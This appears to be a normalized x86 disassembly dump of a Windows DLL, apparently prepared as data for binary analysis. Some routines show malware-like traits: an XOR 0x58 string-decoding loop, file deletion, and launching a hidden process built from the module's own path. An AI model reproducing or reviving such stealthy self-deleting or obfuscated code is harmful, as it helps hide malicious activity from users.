mov [ esi ] r--data
mov ecx esi
mov [ esi + 0x8 ] ebx
call sub_10040209
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x17
mov [ esi ] edi
mov [ esi + 0x28 ] 0x1
call sub_10003a38
mov [ esi ] r--data
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
sub_1006e5c0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10080ba3
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1006e606
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi * 2 - 0x2 ] ax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_100091c8
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_100091c8
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_1006e700
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
add ecx 0x18
push ecx
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0x10 ] 0x0
call sub_10026e29
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp - 0xc ]
sub_1006e750
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ eax + 0x128 ]
test esi esi
jne r-xdata
push edi
lea edi [ eax + 0x130 ]
lea edx [ ebp - 0x38 ]
lea eax [ esi + 0x56 ]
call sub_10053240
lea eax [ esi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
push edi
push esi
call sub_10034b00
mov esi [ esi + 0x4 ]
add esp 0x8
test esi esi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
sub_1006e7c0
push ebp
mov ebp esp
sub esp 0x10
push esi
xor esi esi
cmp [ ebp + 0x1c ] esi
jbe r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
push ebx
add eax 0x8
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0xc ] eax
mov [ ebp + 0x10 ] 0x1
mov ebx [ ecx + 0x24 ]
cmp [ ebx ] 0x0
mov esi [ ebp - 0x8 ]
lea eax [ ecx + 0x24 ]
movzx edx si
je r-xdata
mov edx [ ebp - 0xc ]
mov cl [ edi ]
push edx
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] cl
push 0x1
lea ecx [ ebp - 0x4 ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x10 ] esi
call sub_10026eb0
mov ecx [ ebp + 0x14 ]
add esp 0x14
cmp ecx esi
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
pop edi
pop ebx
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
call edx
movzx eax ax
mov ebx [ ecx + 0x34 ]
cmp [ ebx ] 0x0
jle r-xdata
mov eax [ ebp + 0x1c ]
dec eax
xor esi esi
inc edi
mov [ ebp + 0x1c ] eax
cmp eax esi
ja r-xdata
mov ecx ebx
dec [ ecx ]
mov eax [ eax ]
mov ecx [ eax ]
lea esi [ ecx + 0x2 ]
mov [ eax ] esi
mov [ ecx ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
mov ecx [ ebp + 0x14 ]
jne r-xdata
sub_1006e88c
push 0x28
mov eax sub_1008558c
call sub_100624bc
and [ ebp - 0x10 ] 0x0
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
push 0x5
pop eax
call sub_10013ab8
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x1c
call sub_1001f84c
pop ecx
mov [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] eax
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
mov ecx [ ebp + 0x8 ]
push 0x0
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_10006ada
jmp r-xdata
sub_1006e927
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteFileW@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn
push eax
call sub_1001e7b9
pop ecx
or eax 0xffffffff
pop ebp
retn
test eax eax
je r-xdata
sub_1006e960
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx 0x3
mov [ ebp - 0x108 ] eax
xor eax eax
mov [ ebp - 0x14 ] cx
mov ecx [ r--data ]
push esi
mov [ ebp - 0xfc ] eax
mov [ ebp - 0x104 ] eax
lea ebx [ ebx ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x58
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ ebx + 0x1c ]
xor eax eax
mov [ ebp - 0x20 ] ax
mov esi [ ecx ]
lea edx [ ebp - 0xfc ]
push edx
mov edx [ ebp - 0x14 ]
push r--data
lea eax [ ebp - 0x2c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xfc ]
jns r-xdata
lea edx [ ebp - 0xf0 ]
mov [ ebp - 0xf0 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x69
call sub_10053240
mov esi [ edi + 0x4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xf0 ]
push edx
push ebx
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0xec ]
mov eax 0xe
jmp r-xdata
lea edx [ ebp - 0xec ]
mov eax 0xaf
call sub_10053240
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x38 ]
mov eax 0xa7
call sub_10053240
mov esi [ edi + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xf0 ]
push ecx
push ebx
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0x64
jmp r-xdata
call sub_10053240
lea edx [ ebp - 0x4c ]
mov eax 0xec
call sub_10053240
mov esi [ edi + 0xc ]
push edx
lea eax [ ebp - 0xf0 ]
push eax
push ebx
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x97
jmp r-xdata
mov eax [ ebp - 0xfc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xf0 ] 0x0
lea edx [ ebp - 0x60 ]
mov eax 0x90
call sub_10053240
mov esi [ edi + 0x1c ]
mov ecx edx
push ecx
lea edx [ ebp - 0xf0 ]
push edx
push ebx
call sub_10038760
test eax eax
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0xc
jmp r-xdata
mov ecx [ edi + 0x10 ]
lea eax [ ebp - 0x100 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x100 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x100 ] 0x0
jne r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0x95
jmp r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0xc2
call sub_10053240
mov esi [ ebp - 0x100 ]
push edx
lea eax [ ebp - 0xf0 ]
push eax
push ebx
call sub_10038760
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x100 ] eax
mov edx [ edi + 0x14 ]
lea ecx [ ebp - 0xf8 ]
push ecx
push 0x0
push 0x80000000
push edx
mov [ ebp - 0xf8 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0xf8 ] 0x0
jne r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0x12a
call sub_10053240
lea edx [ ebp - 0x14 ]
mov eax 0x101
call sub_10053240
mov esi [ ebp - 0xf8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xf0 ]
push ecx
push ebx
call sub_10038760
mov eax [ edi + 0x18 ]
lea edx [ ebp - 0xf4 ]
push edx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xf4 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0xf4 ] 0x0
jne r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xf8 ] eax
lea edx [ ebp - 0xd8 ]
mov eax 0xd7
call sub_10053240
mov esi [ ebp - 0xf4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xf0 ]
push edx
push ebx
call sub_10038760
mov eax [ ebp - 0x108 ]
mov eax [ eax ]
mov ecx [ eax ]
lea edx [ ebp - 0x104 ]
push edx
mov edx [ ebp - 0xfc ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x104 ]
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xf4 ] eax
lea edx [ ebp - 0xb8 ]
mov eax 0x47
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x104 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xf0 ]
test eax eax
je r-xdata
sub_1006ece6
push 0x14
mov eax sub_100854e5
call sub_100624bc
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10034e98
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_100389e0
mov ecx [ ebp + 0x8 ]
push eax
call sub_100014d0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10069747
mov eax edi
call sub_10013ab8
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10042efb
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10029420
push edi
call sub_10062b65
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1002c57b
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10024fe9
sub_1006ed90
push ebp
mov ebp esp
push 0xffffffff
push sub_100884c2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10059920
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10059920
push eax
jmp r-xdata
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] edx
mov [ ecx ] dl
call sub_10021bf0
sub_1006ee55
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
push 0x16
pop eax
pop ebp
retn
sub_1006ee90
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ ebp + 0xc ]
mov edx [ eax + 0x8 ]
mov eax [ eax ]
push ecx
push edx
call eax
add esp 0x8
pop ebp
retn
sub_1006eeca
push 0x10
mov eax sub_100855af
call sub_100624bc
mov edi ecx
mov ecx [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10013950
and [ ebp - 0x4 ] 0x0
push eax
call sub_10060b30
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
call sub_10034a80
mov esi [ ebp + 0x28 ]
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x25
jne r-xdata
mov esi [ ebp + 0x20 ]
cmp al 0x20
jne r-xdata
push 0x0
mov eax [ edi ]
inc esi
movzx ecx [ esi ]
push ecx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x1c ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
mov ecx edi
call [ eax + 0x1c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10013ab8
retn 0x24
or [ esi ] 0x1
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
jne r-xdata
inc esi
movzx ebx [ ebp + 0x12 ]
lea eax [ edi + 0x14 ]
push eax
movzx eax [ esi ]
push 0x0
push eax
call sub_100578b0
add esp 0xc
cmp bx ax
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
mov ebx [ ebp - 0x14 ]
mov esi [ ebp + 0x20 ]
or [ esi ] 0x2
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
push [ ebp + 0x12 ]
mov eax [ ebx ]
push 0x48
mov ecx ebx
call [ eax + 0x8 ]
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1001c121
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005a5dc
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10069d0f
test al al
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
sub_1006f000
push ebp
mov ebp esp
push 0xffffffff
push sub_100896fb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa0 ] eax
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_1001a2f0
test eax eax
je r-xdata
mov eax 0x1
mov eax [ rw-data ]
push r--data
mov ecx rw-data
call sub_1001a2f0
test eax eax
je r-xdata
mov eax [ rw-data ]
push r--data
mov ecx rw-data
call sub_1001a2f0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov edi 0x8
cmp [ rw-data ] edi
jae r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x2c ]
call sub_1006f790
add esp 0x4
mov ecx esi
push r--data
push ecx
mov [ ebp - 0x4 ] 0x0
call sub_10069a60
add esp 0x8
test al al
je r-xdata
mov eax rw-data
mov eax [ rw-data ]
cmp [ rw-data ] edi
jae r-xdata
mov ecx esi
call sub_1004c8c0
mov eax 0x2
jmp r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x48 ]
call sub_1006f790
add esp 0x4
mov edx esi
push r--data
push edx
mov [ ebp - 0x4 ] 0x1
call sub_10069a60
add esp 0x8
test al al
je r-xdata
mov eax rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ rw-data ] edi
jae r-xdata
mov ecx esi
call sub_1004c8c0
lea ecx [ ebp - 0x2c ]
call sub_1004c8c0
mov eax 0x3
jmp r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x80 ]
call sub_1006f790
add esp 0x4
mov eax esi
push r--data
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10069a60
add esp 0x8
test al al
je r-xdata
mov eax rw-data
mov eax [ rw-data ]
cmp [ rw-data ] edi
jae r-xdata
mov ecx esi
call sub_1004c8c0
lea ecx [ ebp - 0x48 ]
call sub_1004c8c0
lea ecx [ ebp - 0x2c ]
call sub_1004c8c0
mov eax 0x4
jmp r-xdata
mov ecx [ rw-data ]
push eax
lea esi [ ebp - 0x64 ]
call sub_1006f790
add esp 0x4
mov [ ebp - 0x4 ] 0x3
mov esi [ ebp - 0x50 ]
mov edi [ ebp - 0x64 ]
mov eax edi
cmp esi 0x10
jae r-xdata
mov eax rw-data
push 0x0
push r--data
push eax
call sub_1002b290
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x64 ]
sete al
test al al
sete al
test al al
je r-xdata
cmp [ ebp - 0x54 ] eax
setne al
test eax eax
lea ecx [ ebp - 0x64 ]
call sub_1004c8c0
lea ecx [ ebp - 0x80 ]
call sub_1004c8c0
lea ecx [ ebp - 0x48 ]
call sub_1004c8c0
lea ecx [ ebp - 0x2c ]
call sub_1004c8c0
mov eax 0x5
jmp r-xdata
mov eax edi
cmp esi 0x10
jae r-xdata
push eax
call [ StrToIntA@IAT ]
cmp [ ebp - 0x6c ] 0x10
mov esi [ ebp - 0x80 ]
jae r-xdata
lea eax [ ebp - 0x64 ]
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
lea esi [ ebp - 0x80 ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
jae r-xdata
lea edx [ ebp - 0x48 ]
push 0x0
push eax
push esi
push edx
push ecx
call sub_100156a0
add esp 0x14
push eax
lea ecx [ ebp - 0x9c ]
call sub_10001000
lea ecx [ ebp - 0x9c ]
push r--data
push ecx
mov [ ebp - 0x4 ] 0x4
call sub_10069a60
add esp 0x8
test al al
je r-xdata
lea ecx [ ebp - 0x2c ]
mov ecx [ ebp - 0xa0 ]
lea edx [ ebp - 0x9c ]
push edx
lea eax [ ebp + 0xc ]
push eax
call sub_1001d8a0
add esp 0x8
lea ecx [ ebp - 0x9c ]
call sub_1004c8c0
lea ecx [ ebp - 0x64 ]
call sub_1004c8c0
lea ecx [ ebp - 0x80 ]
call sub_1004c8c0
lea ecx [ ebp - 0x48 ]
call sub_1004c8c0
lea ecx [ ebp - 0x2c ]
call sub_1004c8c0
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x9c ]
call sub_1004c8c0
lea ecx [ ebp - 0x64 ]
call sub_1004c8c0
lea ecx [ ebp - 0x80 ]
call sub_1004c8c0
lea ecx [ ebp - 0x48 ]
call sub_1004c8c0
lea ecx [ ebp - 0x2c ]
call sub_1004c8c0
mov eax 0x6
jmp r-xdata
sub_1006f323
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
call sub_1001366b
pop ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10001000
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_1006f350
cmp esi edi
je r-xdata
mov eax esi
retn
mov eax [ esi + 0x4 ]
dec [ eax ]
jne r-xdata
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1006f390
push ebp
mov ebp esp
sub esp 0xa8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ GetModuleFileNameW@IAT ]
push 0x104
lea eax [ ebp - 0x828 ]
push eax
push 0x0
call esi
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov edx [ rw-data ]
push 0x104
lea ecx [ ebp - 0xa30 ]
push ecx
push edx
call esi
test eax eax
je r-xdata
push r--data
mov edx 0x7ffffffe
mov eax 0x30c
lea ecx [ ebp - 0x620 ]
call sub_10072800
test eax eax
js r-xdata
lea eax [ ebp - 0x828 ]
push eax
lea esi [ ebp - 0x620 ]
call sub_1001f4b0
test eax eax
js r-xdata
push r--data
call sub_1001f4b0
test eax eax
js r-xdata
lea ecx [ ebp - 0xa30 ]
push ecx
call sub_1001f4b0
test eax eax
js r-xdata
push r--data
call sub_1001f4b0
test eax eax
js r-xdata
push rw-data
call sub_1001f4b0
test eax eax
js r-xdata
xor eax eax
push 0x44
push eax
lea edx [ ebp - 0xa88 ]
push edx
mov [ ebp - 0xa40 ] eax
mov [ ebp - 0xa3c ] eax
mov [ ebp - 0xa38 ] eax
mov [ ebp - 0xa34 ] eax
call sub_1007f940
add esp 0xc
lea eax [ ebp - 0xa40 ]
push eax
lea ecx [ ebp - 0xa88 ]
push ecx
push 0x0
push 0x0
push 0x8000000
push 0x0
push 0x0
push 0x0
mov edx esi
push edx
push 0x0
mov [ ebp - 0xa88 ] 0x44
call [ CreateProcessW@IAT ]
sub_1006f4c6
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x88 ] eax
jmp r-xdata
cmp ebx eax
jbe r-xdata
push 0x6
pop ecx
xor eax eax
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
mov eax [ ebp - 0x88 ]
mov ecx [ esi + 0x14 ]
cdq
sub ebx eax
sbb [ ebp - 0x8 ] edx
and [ ebp - 0x80 ] 0x0
and [ ebp - 0x84 ] 0x0
mov eax ecx
and eax 0x3000
cmp eax edi
jne r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop edi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] edi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jl r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x4c
push eax
push [ ebp - 0x8c ]
call sub_1006c82b
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_1005c1c5
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_1003fd35
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn 0x1c
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp ebx edi
jb r-xdata
cmp [ ebp - 0x84 ] edx
jae r-xdata
add ebx 0xfffffff6
fmul st1
adc [ ebp - 0x8 ] 0xffffffff
add [ ebp - 0x84 ] edi
